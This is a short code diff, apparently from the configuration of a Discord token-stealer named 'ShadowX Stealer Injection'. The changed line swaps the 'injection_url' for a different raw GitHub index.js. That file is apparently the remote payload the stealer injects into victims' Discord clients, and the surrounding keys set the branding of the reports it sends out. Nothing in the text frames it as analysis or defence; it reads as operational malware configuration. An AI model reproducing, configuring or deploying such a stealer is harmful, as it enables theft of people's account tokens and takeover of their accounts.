@@ -14,7 +14,7 @@ const config = {
   embed_name: 'ShadowX Stealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1126257156371517461/1126322623136157707/logo_shadow.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/shibachomp/CHOMP/main/index.js', 
   /**
    
    **/
